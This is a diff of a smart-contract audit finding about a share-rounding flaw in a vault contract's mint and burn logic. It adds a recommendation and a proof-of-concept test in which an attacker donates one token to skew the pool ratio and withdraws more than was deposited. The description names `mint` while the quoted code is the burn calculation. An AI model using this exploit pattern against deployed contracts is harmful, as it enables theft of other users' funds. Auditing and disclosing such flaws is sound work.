@@ -144,25 +144,75 @@ app.execute_contract(
 
 ### Description
 
-The bug occurs in `burn`, where rounding
-is floored.
+The flaw occurs in `mint`, where `multiply_ratio` rounds down.
+This favors big one-time transactions over having several
+small transactions.
+
+Hacker can withdraw more than they deposited by reducing
+number of rounding errors compared to other users.
 
 ```rust
  let asset_to_return = shares.multiply_ratio(total_assets, total_supply);
 
 ```
 
-User can burn shares to their advantage and skim
-rounding errors by sending many small transactions.
-
 ### Recommendation
 
-The fix should be round up instead of down in `burn`.
+You should round in favor of the protocol, but use `Decimal`
+instead of `Uint128` for better precision of minted shares.
+This approach is better for users with many transactions
+over time.
+
+```rust
+// state.rs
+#[cw_serde]
+#[derive(Default)]
+pub struct Balance {
+    pub amount: Decimal,
+}
+```
 
 ### Proof of concept
 
+See `exploit_rounding` in integration tests.
+
 ```rust
-// code goes here
+// Hacker deposits 1_000
+app.execute_contract(
+    Addr::unchecked(HACKER),
+    contract_addr.clone(),
+    &ExecuteMsg::Mint {},
+    &[coin(1_000, DENOM)],
+)
+.unwrap();
+// EXPLOIT: Hacker messes with pool ratio by bank sending 1 token
+app.execute(
+    Addr::unchecked(HACKER),
+    CosmosMsg::Bank(BankMsg::Send {
+        to_address: contract_addr.to_string(),
+        amount: vec![coin(1, DENOM)],
+    }),
+)
+.unwrap();
+
+// ... 
+// one or many users submit transactions that are 
+// rounded down
+
+// Hacker burns shares
+app.execute_contract(
+    Addr::unchecked(HACKER),
+    contract_addr.clone(),
+    &ExecuteMsg::Burn {
+        shares: balance.amount,
+    },
+    &[],
+)
+.unwrap();
+// Hacker deposited 1_000, bank sent 1,
+// but got 1_009 back
+let bal = app.wrap().query_balance(HACKER, DENOM).unwrap();
+assert_eq!(bal.amount, Uint128::new(1_009));
 ```
 
 ---
